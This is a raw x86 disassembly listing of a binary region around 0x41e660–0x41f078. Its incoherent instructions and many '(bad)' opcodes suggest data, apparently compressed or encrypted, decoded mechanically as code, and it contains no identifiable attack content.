  41e660:	and    ebp,DWORD PTR [esi]
  41e662:	sbb    dh,bh
  41e664:	mov    dh,0x6
  41e666:	nop
  41e667:	adc    esp,DWORD PTR [eax+edx*4-0x1944e720]
  41e66e:	xor    al,0x4c
  41e670:	(bad)  
  41e671:	in     eax,dx
  41e672:	sbb    cl,cl
  41e674:	mov    es:0x346324a8,al
  41e67a:	ror    BYTE PTR [eax],0xc
  41e67d:	cli    
  41e67e:	dec    eax
  41e67f:	dec    ecx
  41e680:	jb     0x41e61f
  41e682:	loopne 0x41e629
  41e684:	aaa    
  41e685:	sbb    esi,DWORD PTR [eax+0x4052a45]
  41e68b:	mov    bh,0x7e
  41e68d:	ja     0x41e6b7
  41e68f:	xchg   esp,eax
  41e690:	mov    cl,0xa6
  41e692:	and    al,0x8d
  41e694:	adc    ch,BYTE PTR [edi]
  41e696:	retf   0x2cac
  41e699:	xor    BYTE PTR [edx-0x6ad2ac04],cl
  41e69f:	sbb    BYTE PTR [edx+edi*4+0x4e363acb],ch
  41e6a6:	test   BYTE PTR [edi],0x31
  41e6a9:	jmp    0xcf4a:0x5aa9c3fd
  41e6b0:	adc    edx,DWORD PTR ds:0xadc36b79
  41e6b6:	cs dec eax
  41e6b8:	jge    0x41e6b2
  41e6ba:	dec    edx
  41e6bb:	xacquire xchg BYTE PTR [edi],ah
  41e6be:	push   ebp
  41e6bf:	in     al,0x6e
	...
  41e731:	add    BYTE PTR [eax],al
  41e733:	add    BYTE PTR [esi+ecx*8],ah
  41e736:	outs   dx,BYTE PTR ds:[esi]
  41e737:	sub    ch,dh
  41e739:	stos   BYTE PTR es:[edi],al
  41e73a:	fs into 
  41e73c:	cmp    al,0xb2
  41e73e:	xor    ebp,DWORD PTR [ebx+0x71ae9410]
  41e744:	sub    al,BYTE PTR [edi+0x1]
  41e747:	add    ch,dh
  41e749:	add    BYTE PTR [eax],al
  41e74b:	add    BYTE PTR [eax-0x16],cl
  41e74e:	jns    0x41e770
  41e750:	loopne 0x41e6f1
  41e752:	sub    ecx,DWORD PTR [ebx]
  41e754:	jp     0x41e6df
  41e756:	or     BYTE PTR [esi+0x36c3d3c0],0x49
  41e75d:	out    0xc2,al
  41e75f:	loopne 0x41e720
  41e761:	and    eax,0x4ae72730
  41e766:	stos   BYTE PTR es:[edi],al
  41e767:	xor    eax,0x59e061b8
  41e76c:	repnz hlt 
  41e76e:	jmp    0x5ec99079
  41e773:	push   ebx
  41e774:	jae    0x41e795
  41e776:	test   DWORD PTR [edi-0x4d],ebp
  41e779:	call   0x8bd1e618
  41e77e:	repnz (bad) 
  41e780:	iret   
  41e781:	mov    esp,ebx
  41e783:	jp     0x41e7ea
  41e785:	repnz addr16 lahf 
  41e788:	jne    0x41e7f0
  41e78a:	mov    ah,al
  41e78c:	push   ebp
  41e78d:	xchg   edx,eax
  41e78e:	and    DWORD PTR gs:[esi+0x7ee25fdf],eax
  41e795:	mov    ebx,0x7d4c7d0a
  41e79a:	leave  
  41e79b:	sbb    eax,DWORD PTR [esp+ecx*1+0x6d]
  41e79f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e7a0:	add    cl,BYTE PTR [edx+0x27]
  41e7a3:	ins    DWORD PTR es:[edi],dx
  41e7a4:	xor    eax,0xf860d586
  41e7a9:	pop    ebx
  41e7aa:	mov    esp,0x829fdba7
  41e7af:	retf   0xdb5
  41e7b2:	cli    
  41e7b3:	cmp    esp,DWORD PTR [esi]
  41e7b5:	sub    cl,al
  41e7b7:	outs   dx,BYTE PTR ds:[esi]
  41e7b8:	mov    ds:0xb183b804,eax
  41e7bd:	cwde   
  41e7be:	pop    edx
  41e7bf:	fimul  DWORD PTR [edx]
  41e7c1:	mov    cl,0x27
  41e7c3:	jne    0x41e832
  41e7c5:	rcl    DWORD PTR [ebx-0x51],cl
  41e7c8:	push   eax
  41e7c9:	adc    BYTE PTR [eax+eiz*1-0x30],ch
  41e7cd:	xor    BYTE PTR [eax+0x5d073019],al
  41e7d3:	adc    ecx,DWORD PTR [ecx+0x77]
  41e7d6:	call   0x41db20e8
  41e7db:	arpl   WORD PTR [eax+ebx*2+0x5b42e4fa],bp
  41e7e2:	aaa    
  41e7e3:	fdiv   DWORD PTR [esi]
  41e7e5:	xor    eax,0x9f0e2d00
  41e7ea:	mov    bl,0x70
  41e7ec:	cmp    edi,ebp
  41e7ee:	outs   dx,DWORD PTR ds:[esi]
  41e7ef:	jmp    0xa96:0x468eb3ba
  41e7f6:	loopne 0x41e827
  41e7f8:	mov    ds:0x2d6ba152,eax
  41e7fd:	scas   al,BYTE PTR es:[edi]
  41e7fe:	and    eax,0xb4d1675d
  41e803:	shl    DWORD PTR [edx],1
  41e805:	lar    ebp,WORD PTR ds:[ebx]
  41e809:	add    DWORD PTR [esi+0x7352a491],edi
  41e80f:	in     al,0x63
  41e811:	aad    0xf6
  41e813:	xchg   edi,eax
  41e814:	std    
  41e815:	pop    ecx
  41e816:	shl    ebp,cl
  41e818:	mov    BYTE PTR [esi-0x27],dl
  41e81b:	sub    al,0xe2
  41e81d:	ds dec esi
  41e81f:	mov    ebp,0x12b3fdc
  41e824:	ins    BYTE PTR es:[edi],dx
  41e825:	ret    
  41e826:	pop    eax
  41e827:	mov    dh,0x7f
  41e829:	jnp    0x41e7c4
  41e82b:	adc    al,0xfb
  41e82e:	mov    dh,0xbd
  41e830:	loop   0x41e7c2
  41e832:	push   esi
  41e833:	push   ebx
  41e834:	scas   eax,DWORD PTR es:[edi]
  41e835:	adc    cl,BYTE PTR [ecx]
  41e837:	les    edx,FWORD PTR [eax]
  41e839:	xchg   esi,eax
  41e83a:	repnz cwde 
  41e83c:	add    edx,ebp
  41e83e:	jns    0x41e8b8
  41e840:	scas   al,BYTE PTR es:[edi]
	...
  41e8b1:	add    BYTE PTR [eax],al
  41e8b3:	add    ah,al
  41e8b5:	ins    BYTE PTR es:[edi],dx
  41e8b6:	pop    es
  41e8b7:	pushf  
  41e8b8:	scas   eax,DWORD PTR es:[edi]
  41e8b9:	(bad)  
  41e8ba:	fistp  QWORD PTR [esi+eiz*4-0x50]
  41e8be:	loop   0x41e93a
  41e8c0:	fist   WORD PTR [edi+0x6e]
  41e8c3:	call   0xf5:0x1481f
  41e8ca:	add    BYTE PTR [eax],al
  41e8cc:	adc    eax,0x9aa23051
  41e8d1:	xor    eax,0x5ede126
  41e8d6:	pusha  
  41e8d7:	jp     0x41e881
  41e8d9:	and    edi,DWORD PTR [edi-0x76]
  41e8dc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41e8dd:	data16 adc al,0x3
  41e8e0:	popf   
  41e8e1:	mov    dh,0x17
  41e8e3:	in     eax,dx
  41e8e4:	jne    0x41e923
  41e8e6:	push   0x8
  41e8e8:	int    0xf1
  41e8ea:	cmp    edx,eax
  41e8ec:	xchg   esp,eax
  41e8ed:	xor    DWORD PTR [ecx+0x316ac529],edx
  41e8f3:	inc    edi
  41e8f4:	or     al,0xad
  41e8f6:	test   al,0xf1
  41e8f8:	mov    BYTE PTR [esi+0x4d4e077d],cl
  41e8fe:	shl    BYTE PTR [eax-0x62],cl
  41e901:	jl     0x41e8fd
  41e903:	add    al,0x84
  41e905:	sbb    eax,0xbf4fb1e2
  41e90a:	pop    edi
  41e90b:	jmp    0x7271:0xc28a4af5
  41e912:	cwde   
  41e913:	inc    edx
  41e914:	jecxz  0x41e945
  41e916:	inc    ecx
  41e917:	stos   DWORD PTR es:[edi],eax
  41e918:	aaa    
  41e919:	inc    ebx
  41e91a:	aad    0x8a
  41e91c:	int3   
  41e91d:	sbb    ch,bh
  41e91f:	repnz sbb esi,eax
  41e922:	or     edx,ebx
  41e924:	in     al,0x22
  41e926:	dec    edx
  41e927:	out    dx,al
  41e928:	sub    esp,0x11cf39b9
  41e92e:	cdq    
  41e92f:	int3   
  41e930:	mov    eax,0xfdb749c2
  41e935:	lods   al,BYTE PTR ds:[esi]
  41e936:	xchg   edx,eax
  41e937:	fidivr DWORD PTR [esi-0x40f04b3]
  41e93d:	mov    esi,0x35875107
  41e942:	jmp    FWORD PTR [esi]
  41e944:	jb     0x41e92f
  41e946:	in     al,dx
  41e947:	fucomi st,st(0)
  41e949:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e94a:	mov    dh,0x8f
  41e94c:	cdq    
  41e94d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e94e:	push   edi
  41e94f:	test   al,0x70
  41e951:	inc    esp
  41e952:	or     cl,BYTE PTR cs:[ebx+0x787ac802]
  41e959:	mov    al,0x5
  41e95b:	in     al,dx
  41e95c:	rcl    BYTE PTR [ebp+ebx*2+0xe74b484],1
  41e963:	into   
  41e964:	(bad)  
  41e965:	jmp    0xad65bb29
  41e96a:	push   ss
  41e96b:	mov    DWORD PTR [edx+0x3dd93a42],ebp
  41e971:	sbb    eax,0xe4d06c11
  41e976:	sbb    bl,BYTE PTR [esi+0xe]
  41e979:	and    cl,BYTE PTR [ebx]
  41e97b:	sub    DWORD PTR [ecx-0x53],esi
  41e97e:	(bad)  
  41e97f:	lahf   
  41e980:	adc    bl,0x3
  41e983:	out    dx,eax
  41e984:	add    BYTE PTR [edx+0xd688ba],bl
  41e98a:	jmp    0x9e8fbaff
  41e98f:	add    BYTE PTR [ecx],bl
  41e991:	xor    ebp,DWORD PTR [ecx-0x62aedecc]
  41e997:	mov    BYTE PTR [ebp+esi*1-0x63],al
  41e99b:	(bad)  
  41e99c:	cmc    
  41e99d:	test   eax,0x5d3dd738
  41e9a2:	cmp    eax,0x995170c6
  41e9a7:	pop    eax
  41e9a8:	cli    
  41e9a9:	imul   ebx,edx,0xe0376549
  41e9af:	sti    
  41e9b0:	ror    BYTE PTR [edx],1
  41e9b2:	lods   eax,DWORD PTR ds:[esi]
  41e9b3:	pop    ebx
  41e9b4:	dec    edi
  41e9b5:	cmp    eax,0x7e5a30e6
  41e9ba:	pop    ds
  41e9bb:	push   0x77
  41e9bd:	sbb    eax,0xf361aa
	...
  41ea32:	add    BYTE PTR [eax],al
  41ea34:	sbb    al,0x15
  41ea36:	jnp    0x41ea8b
  41ea38:	jnp    0x41eab9
  41ea3a:	cmp    al,0x5f
  41ea3c:	les    ecx,FWORD PTR [ebx+0x21]
  41ea3f:	fisttp QWORD PTR [ebx]
  41ea41:	imul   ebp,DWORD PTR cs:[edi+0x14],0x49
  41ea46:	add    DWORD PTR [eax],eax
  41ea48:	cmc    
  41ea49:	add    BYTE PTR [eax],al
  41ea4b:	add    BYTE PTR [edi-0x33],bl
  41ea4e:	mov    ebp,0x5321411f
  41ea53:	or     dl,dl
  41ea55:	add    edx,DWORD PTR [edi+0x23]
  41ea58:	jge    0x41ea31
  41ea5a:	int3   
  41ea5b:	xor    BYTE PTR [esp+edi*4+0x24adc6b0],bh
  41ea62:	lds    esp,FWORD PTR [esi-0x48]
  41ea65:	mov    bh,0x1d
  41ea67:	dec    ecx
  41ea68:	jne    0x41ea78
  41ea6a:	inc    edx
  41ea6b:	sar    DWORD PTR [ebx+0x5aa52f64],1
  41ea71:	adc    edx,DWORD PTR [edx+0x72d2df48]
  41ea77:	scas   al,BYTE PTR es:[edi]
  41ea78:	in     eax,dx
  41ea79:	rep outs dx,DWORD PTR ds:[esi]
  41ea7b:	push   ebx
  41ea7c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ea7d:	imul   DWORD PTR [edx-0x2af45f50]
  41ea83:	cmp    eax,0x37002d74
  41ea88:	or     al,0x12
  41ea8a:	add    al,0x5e
  41ea8c:	repz jae 0x41ea80
  41ea8f:	jmp    0x41eae4
  41ea91:	fistp  WORD PTR [ecx-0x2d0973ce]
  41ea97:	int    0xd5
  41ea99:	jb     0x41eae8
  41ea9b:	(bad)  
  41ea9c:	js     0x41ea8b
  41ea9e:	test   DWORD PTR [esi-0x72],ebp
  41eaa1:	add    DWORD PTR [ecx+0x68e00bd9],eax
  41eaa7:	sbb    dh,al
  41eaa9:	xchg   esi,eax
  41eaaa:	cmp    eax,0x90dec85b
  41eaaf:	(bad)  
  41eab0:	jbe    0x41ea69
  41eab2:	dec    esp
  41eab3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41eab4:	mov    ds:0x21588803,eax
  41eab9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41eaba:	pop    ebp
  41eabb:	imul   ebx,DWORD PTR [edi+0x6b87a224],0xffffffa7
  41eac2:	xchg   DWORD PTR [eax+0x264aa731],eax
  41eac8:	dec    ebx
  41eac9:	enter  0x4ab2,0xd8
  41eacd:	jb     0x41eb39
  41eacf:	test   BYTE PTR [eax+0xc8417],dl
  41ead5:	xchg   ebp,eax
  41ead6:	(bad)  
  41ead7:	push   cs
  41ead8:	xor    dh,BYTE PTR [eax+0x6b]
  41eadb:	add    bh,BYTE PTR [ebp-0x8e6a59f]
  41eae1:	and    BYTE PTR [ecx],cl
  41eae3:	mov    ebp,0xd58b9b31
  41eae8:	or     al,0xab
  41eaea:	test   BYTE PTR [ebx+eiz*4-0x50451250],ch
  41eaf1:	test   BYTE PTR [eax],bh
  41eaf3:	int3   
  41eaf4:	mov    dh,0x25
  41eaf6:	jmp    0xde08:0x4f9165cc
  41eafd:	xchg   esp,eax
  41eafe:	jp     0x41eafb
  41eb00:	pop    eax
  41eb01:	mov    eax,0xde443389
  41eb06:	xlat   BYTE PTR ds:[ebx]
  41eb07:	mul    DWORD PTR [edi]
  41eb09:	and    eax,DWORD PTR [ecx+0x6f]
  41eb0c:	push   edi
  41eb0d:	sbb    BYTE PTR [esi],0x3
  41eb10:	aad    0x96
  41eb12:	sub    ah,0xa
  41eb15:	dec    esi
  41eb16:	pop    ebp
  41eb17:	test   BYTE PTR [ebx],bl
  41eb19:	cmp    eax,0xf1c33852
  41eb1e:	mov    bh,0x80
  41eb20:	es imul edi,ebp,0x40
  41eb24:	rcr    BYTE PTR [eax],1
  41eb26:	out    0xf3,al
  41eb28:	les    edi,FWORD PTR ds:0x7a12441b
  41eb2e:	or     esp,DWORD PTR [eax]
  41eb30:	pop    es
  41eb31:	dec    ecx
  41eb32:	ins    DWORD PTR es:[edi],dx
  41eb33:	in     al,dx
  41eb34:	mov    ah,0xf7
  41eb36:	jecxz  0x41eaed
  41eb38:	rol    DWORD PTR [eax-0x62],0x4e
  41eb3c:	setnp  dh
  41eb3f:	pop    esp
  41eb40:	lds    eax,FWORD PTR [eax]
	...
  41ebb2:	add    BYTE PTR [eax],al
  41ebb4:	outs   dx,DWORD PTR ds:[esi]
  41ebb5:	retf   0x9815
  41ebb8:	mov    ch,0xdf
  41ebba:	out    dx,eax
  41ebbb:	inc    DWORD PTR [ebx+0x1e]
  41ebbe:	arpl   sp,si
  41ebc0:	push   ecx
  41ebc1:	iret   
  41ebc2:	into   
  41ebc3:	xchg   BYTE PTR [ecx],cl
  41ebc5:	dec    edx
  41ebc6:	add    DWORD PTR [eax],eax
  41ebc8:	cmc    
  41ebc9:	add    BYTE PTR [eax],al
  41ebcb:	add    BYTE PTR [ebx],bl
  41ebcd:	mov    al,ds:0xfc4cab92
  41ebd2:	aam    0x82
  41ebd4:	call   0x643bfb4b
  41ebd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebda:	push   edi
  41ebdb:	int3   
  41ebdc:	dec    ebp
  41ebdd:	mov    dl,0x92
  41ebdf:	push   ss
  41ebe0:	mov    bl,0x4f
  41ebe2:	jne    0x41ebc9
  41ebe4:	fisub  DWORD PTR ds:0x8aedb522
  41ebea:	jbe    0x41ec21
  41ebec:	adc    eax,0x252a9d12
  41ebf1:	and    dh,dh
  41ebf3:	stos   BYTE PTR es:[edi],al
  41ebf4:	dec    ebp
  41ebf5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ebf6:	cmp    ecx,edi
  41ebf8:	inc    edi
  41ebf9:	add    ebx,edx
  41ebfb:	mov    fs,ecx
  41ebfd:	not    ah
  41ebff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ec00:	das    
  41ec01:	pop    ebx
  41ec02:	fs in  eax,dx
  41ec04:	xchg   ebp,eax
  41ec05:	inc    ecx
  41ec06:	scas   al,BYTE PTR es:[edi]
  41ec07:	add    al,cl
  41ec09:	(bad)  
  41ec0b:	je     0x41ebca
  41ec0d:	das    
  41ec0e:	jmp    0x6b576b8d
  41ec13:	mov    eax,0x3197ce7b
  41ec18:	xor    edi,DWORD PTR [ecx]
  41ec1a:	mov    al,0x8
  41ec1c:	mov    ds:0xaf4c9522,eax
  41ec21:	add    bh,0x4e
  41ec24:	enter  0x280e,0xfa
  41ec28:	fnstenv [eax]
  41ec2a:	mov    al,0x2b
  41ec2c:	xor    esp,esp
  41ec2e:	test   al,0x69
  41ec30:	cld    
  41ec31:	rol    DWORD PTR [edi+0xf],1
  41ec34:	xchg   esp,eax
  41ec35:	jnp    0x41ec04
  41ec37:	ror    BYTE PTR [eax],1
  41ec39:	mov    cl,0x8c
  41ec3b:	(bad)  
  41ec3c:	aas    
  41ec3d:	int3   
  41ec3e:	mov    ecx,0x971e814d
  41ec43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ec44:	loopne 0x41ebf4
  41ec46:	pusha  
  41ec47:	pushf  
  41ec48:	mov    al,0xe2
  41ec4a:	inc    eax
  41ec4b:	sub    al,0x2
  41ec4d:	ss jl  0x41ec37
  41ec50:	xor    al,0x68
  41ec52:	inc    eax
  41ec53:	xchg   ecx,eax
  41ec54:	adc    al,BYTE PTR [ecx-0x3f5f581d]
  41ec5a:	aad    0xc
  41ec5c:	mov    ebp,0x6c1df6f3
  41ec61:	je     0x41ec80
  41ec63:	test   DWORD PTR [ebx-0x59292e2e],esi
  41ec69:	mov    ebp,0x60c9ad22
  41ec6e:	leave  
  41ec6f:	jbe    0x1f62a5d4
  41ec75:	jl     0x41ec67
  41ec77:	xchg   edx,eax
  41ec78:	rcl    DWORD PTR [ebp+0x45],1
  41ec7b:	iret   
  41ec7c:	push   ebp
  41ec7d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ec7e:	iret   
  41ec7f:	pop    eax
  41ec80:	fidiv  WORD PTR [ebp-0x77]
  41ec83:	cld    
  41ec84:	mov    ebp,0xd1940f23
  41ec89:	jno    0x41ec66
  41ec8b:	adc    bl,BYTE PTR [ecx+ecx*2]
  41ec8e:	je     0x41ecc9
  41ec90:	sbb    eax,0xb349e06d
  41ec95:	jecxz  0x41ec6f
  41ec97:	xchg   DWORD PTR [esi+0x6a],esi
  41ec9a:	loope  0x41ec2f
  41ec9c:	adc    esi,DWORD PTR [eax]
  41ec9e:	ss pop es
  41eca0:	hlt    
  41eca1:	pop    edi
  41eca2:	out    dx,al
  41eca3:	cmp    ch,dl
  41eca5:	cld    
  41eca6:	and    eax,0x104a6248
  41ecab:	push   ebp
  41ecac:	inc    edi
  41ecad:	out    dx,eax
  41ecae:	mov    bl,0x17
  41ecb0:	jge    0x41eccc
  41ecb2:	in     eax,0xa5
  41ecb4:	(bad)  ss:0x52a87ca0
  41ecbb:	sub    eax,0xac31c6bf
  41ecc0:	add    al,0x0
	...
  41ed32:	add    BYTE PTR [eax],al
  41ed34:	and    bl,dh
  41ed36:	das    
  41ed37:	cmp    bh,0xde
  41ed3a:	lods   eax,DWORD PTR ds:[esi]
  41ed3b:	repz xlat BYTE PTR ds:[ebx]
  41ed3d:	in     al,dx
  41ed3e:	pusha  
  41ed3f:	out    dx,al
  41ed40:	pop    ss
  41ed41:	pop    esi
  41ed42:	and    BYTE PTR [ecx],0xfe
  41ed45:	dec    edx
  41ed46:	add    DWORD PTR [eax],eax
  41ed48:	cmc    
  41ed49:	add    BYTE PTR [eax],al
  41ed4b:	add    BYTE PTR [edx],ch
  41ed4d:	jmp    eax
  41ed4f:	dec    eax
  41ed50:	das    
  41ed51:	push   0x9b39b759
  41ed56:	pop    esi
  41ed57:	js     0x41eda7
  41ed59:	stc    
  41ed5a:	lods   eax,DWORD PTR ds:[esi]
  41ed5b:	push   0x46
  41ed5d:	xchg   edx,eax
  41ed5e:	in     eax,0x42
  41ed60:	pop    eax
  41ed61:	lds    ecx,FWORD PTR [ecx]
  41ed63:	retf   0x9e8e
  41ed66:	mov    ebx,0x85fe02dc
  41ed6b:	pop    es
  41ed6c:	ds and esi,DWORD PTR cs:[edx-0x73c0fc87]
  41ed74:	push   esp
  41ed75:	push   es
  41ed76:	pop    edx
  41ed77:	dec    esp
  41ed78:	push   esp
  41ed79:	je     0x41edac
  41ed7b:	sahf   
  41ed7c:	pop    ecx
  41ed7d:	mov    edx,0xef01ee82
  41ed82:	hlt    
  41ed83:	pop    ebx
  41ed84:	push   edi
  41ed85:	mov    ecx,0xb848d3de
  41ed8a:	xor    ch,bl
  41ed8c:	(bad)  
  41ed8d:	cmp    esp,DWORD PTR [ebp+0x55]
  41ed90:	add    DWORD PTR ds:0xd59de0d1,0x35
  41ed97:	sbb    eax,0xaf11a93
  41ed9c:	mov    esp,DWORD PTR ds:0x410e4ec7
  41eda2:	arpl   WORD PTR [eax-0x55],cx
  41eda5:	ret    0x1a71
  41eda8:	and    bl,BYTE PTR [esi]
  41edaa:	dec    ecx
  41edab:	fwait
  41edac:	or     al,0x19
  41edae:	in     eax,0x3a
  41edb0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41edb1:	outs   dx,BYTE PTR ds:[esi]
  41edb2:	fdivr  QWORD PTR [eax+0x73]
  41edb5:	adc    eax,0xe713c0a8
  41edba:	pop    ds
  41edbb:	shl    bh,cl
  41edbd:	cld    
  41edbe:	hlt    
  41edbf:	xchg   edx,eax
  41edc0:	pop    es
  41edc1:	xlat   BYTE PTR ds:[ebx]
  41edc2:	mov    dl,0x5d
  41edc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41edc5:	mov    ?,WORD PTR [eax-0x61]
  41edc8:	xchg   ecx,eax
  41edc9:	xor    DWORD PTR [edx+0x4d],eax
  41edcc:	add    al,0x83
  41edce:	ins    DWORD PTR es:[edi],dx
  41edcf:	(bad)
  41edd3:	sbb    eax,DWORD PTR [esi]
  41edd5:	mov    edx,0xfc08d03b
  41edda:	call   0xc93:0x5273ee77
  41ede1:	call   0x4820:0x14c83fa3
  41ede8:	(bad)  
  41edea:	imul   esp,DWORD PTR [edi+0x6d6e7444],0xffffffdb
  41edf1:	xchg   esi,eax
  41edf2:	std    
  41edf3:	arpl   WORD PTR [esp+ebp*2-0x7eb96b7c],di
  41edfa:	fnstenv [ebx]
  41edfc:	sti    
  41edfd:	adc    BYTE PTR [esi],bh
  41edff:	clc    
  41ee00:	in     al,dx
  41ee01:	jnp    0x41ee13
  41ee03:	cwde   
  41ee04:	dec    esp
  41ee05:	adc    al,0x4
  41ee07:	adc    al,0x69
  41ee09:	cmc    
  41ee0a:	xor    DWORD PTR [ebp-0x2a],edx
  41ee0d:	push   ecx
  41ee0e:	lock dec ebp
  41ee10:	add    eax,0x2c0a4dde
  41ee15:	xlat   BYTE PTR ds:[ebx]
  41ee16:	xor    dh,bh
  41ee18:	shr    DWORD PTR [ebx+ecx*1],1
  41ee1b:	xlat   BYTE PTR ds:[ebx]
  41ee1c:	in     eax,0xd8
  41ee1e:	dec    edx
  41ee1f:	test   DWORD PTR [ebp+ebx*2-0x18],edi
  41ee23:	push   0xffffff9c
  41ee25:	mov    edx,0x87c4882b
  41ee2a:	(bad)  
  41ee2b:	sub    dl,BYTE PTR es:[esi]
  41ee2e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ee2f:	adc    al,cl
  41ee31:	xor    DWORD PTR [eax],ecx
  41ee33:	inc    edx
  41ee34:	pop    esp
  41ee35:	retf   
  41ee36:	pusha  
  41ee37:	scas   eax,DWORD PTR es:[edi]
  41ee38:	cwde   
  41ee39:	mov    cl,0xe8
  41ee3b:	out    dx,al
  41ee3c:	test   DWORD PTR [edi],ecx
  41ee3e:	repnz cmp ch,dl
	...
  41eeb1:	add    BYTE PTR [eax],al
  41eeb3:	add    BYTE PTR [edi],bh
  41eeb5:	daa    
  41eeb6:	push   ss
  41eeb7:	cld    
  41eeb8:	push   ds
  41eeb9:	std    
  41eeba:	jmp    edi
  41eebc:	push   eax
  41eebd:	jg     0x41eee4
  41eebf:	push   esp
  41eec0:	add    ch,BYTE PTR [eax]
  41eec2:	cdq    
  41eec3:	inc    edi
  41eec4:	repz dec ebx
  41eec6:	add    DWORD PTR [eax],eax
  41eec8:	cmc    
  41eec9:	add    BYTE PTR [eax],al
  41eecb:	add    BYTE PTR [ecx+0x123f93a7],bh
  41eed1:	mov    edx,DWORD PTR [eax]
  41eed3:	cs fdiv st,st(7)
  41eed6:	xchg   ebp,eax
  41eed7:	or     DWORD PTR [ecx],ecx
  41eed9:	fstp   TBYTE PTR [edi]
  41eedb:	sub    DWORD PTR [esi+0x46],0xd10a07db
  41eee2:	mov    ds:0xc395ecc5,al
  41eee7:	push   esi
  41eee8:	fcom   DWORD PTR [esi+0x1b8864c9]
  41eeee:	add    ecx,DWORD PTR [ecx-0x17b43ac5]
  41eef4:	sbb    edi,ebx
  41eef6:	or     BYTE PTR [esi+eiz*4],al
  41eef9:	in     eax,dx
  41eefa:	scas   al,BYTE PTR es:[edi]
  41eefb:	or     eax,eax
  41eefd:	addr16 jnp 0x41eebc
  41ef00:	mov    ebp,0x5cd2c287
  41ef05:	sahf   
  41ef06:	cwde   
  41ef07:	mov    bh,0x4a
  41ef09:	pop    es
  41ef0a:	push   es
  41ef0b:	loop   0x41ef82
  41ef0d:	cmp    edx,DWORD PTR [esi+0x3c]
  41ef10:	mov    esp,esi
  41ef12:	inc    esi
  41ef13:	int3   
  41ef14:	jmp    DWORD PTR [edx+ecx*8+0x2d]
  41ef18:	or     BYTE PTR [ebp+0x37],bl
  41ef1b:	push   ds
  41ef1c:	adc    eax,0xff1b434
  41ef21:	xchg   ebx,eax
  41ef22:	pop    es
  41ef23:	or     edx,DWORD PTR [ebp+0x167f8c3]
  41ef29:	jbe    0x41ef9a
  41ef2b:	aam    0xb
  41ef2d:	mov    dh,0xf8
  41ef2f:	add    esi,DWORD PTR ds:0x57f37c1
  41ef35:	cld    
  41ef36:	mov    DWORD PTR ds:0xc9c4d5c5,ebx
  41ef3c:	lahf   
  41ef3d:	fisub  DWORD PTR [esi+0x1f25101e]
  41ef43:	int3   
  41ef44:	dec    eax
  41ef45:	inc    ebp
  41ef46:	sub    eax,0x3fc1d841
  41ef4b:	sub    cl,bl
  41ef4d:	ret    
  41ef4e:	xchg   DWORD PTR [ebp-0x3f2d4a6f],ebx
  41ef54:	in     eax,dx
  41ef55:	test   al,0xa5
  41ef57:	mov    bh,0x91
  41ef59:	iret   
  41ef5a:	ret    0x2530
  41ef5d:	aad    0xf8
  41ef5f:	dec    edi
  41ef60:	xor    ecx,DWORD PTR [ebx]
  41ef62:	fnstsw WORD PTR [edx+0x4d]
  41ef65:	scas   eax,DWORD PTR es:[edi]
  41ef66:	in     eax,0x96
  41ef68:	mov    ebx,0x464fdb1a
  41ef6d:	add    eax,0x26fe619c
  41ef72:	sub    ah,BYTE PTR ds:0x228893dc
  41ef78:	lahf   
  41ef79:	bound  ecx,QWORD PTR [eax+esi*1+0x61]
  41ef7d:	pop    es
  41ef7e:	inc    eax
  41ef7f:	xor    esp,DWORD PTR [ecx+0x6d9c21b5]
  41ef85:	call   0x7dc1:0xeba0aec7
  41ef8c:	cdq    
  41ef8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef8e:	sbb    al,0x28
  41ef90:	pop    eax
  41ef91:	ret    0x17d0
  41ef94:	call   0xcbdd25ff
  41ef99:	mov    ds:0x3fcb1de0,eax
  41ef9e:	addr16 xor al,0x1b
  41efa1:	aad    0x9d
  41efa3:	xchg   ecx,eax
  41efa4:	lods   al,BYTE PTR ds:[esi]
  41efa5:	aaa    
  41efa6:	and    al,BYTE PTR [eax]
  41efa8:	xlat   BYTE PTR ds:[ebx]
  41efa9:	sub    BYTE PTR [ebx-0x711c81ff],dl
  41efaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41efb0:	mov    dh,0xa8
  41efb2:	and    ecx,ecx
  41efb4:	jne    0x41f002
  41efb6:	loop   0x41efb6
  41efb8:	mov    esi,0x2db7b08c
  41efbd:	xlat   BYTE PTR ds:[ebx]
  41efbe:	mov    edx,0x684f
	...
  41f033:	add    BYTE PTR [edi+0x53],cl
  41f036:	add    al,0xc
  41f038:	sbb    al,0x5f
  41f03a:	dec    edi
  41f03b:	push   ebx
  41f03c:	cwde   
  41f03d:	adc    edi,DWORD PTR [ebp+ecx*4-0x25]
  41f041:	loopne 0x41f045
  41f043:	add    ch,al
  41f045:	dec    esp
  41f046:	add    DWORD PTR [eax],eax
  41f048:	cmc    
  41f049:	add    BYTE PTR [eax],al
  41f04b:	add    BYTE PTR [ebp+0x5f72aeae],al
  41f051:	xchg   ecx,eax
  41f052:	sahf   
  41f053:	cdq    
  41f054:	ja     0x41f0a8
  41f056:	stos   BYTE PTR es:[edi],al
  41f057:	push   edx
  41f058:	popa   
  41f059:	inc    edx
  41f05a:	pop    fs
  41f05c:	adc    BYTE PTR [edx+0x63],0xb9
  41f060:	sbb    bl,BYTE PTR [edi+eiz*4]
  41f063:	je     0x41f0e4
  41f065:	lods   al,BYTE PTR ds:[esi]
  41f066:	mov    cl,0xc1
  41f068:	lods   al,BYTE PTR ds:[esi]
  41f069:	loop   0x41f0de
  41f06b:	adc    cl,BYTE PTR [eax]
  41f06d:	iret   
  41f06e:	imul   ebx,DWORD PTR [edi-0x1a],0x676d791
  41f075:	(bad)
  41f078:	ja     0x41f02e
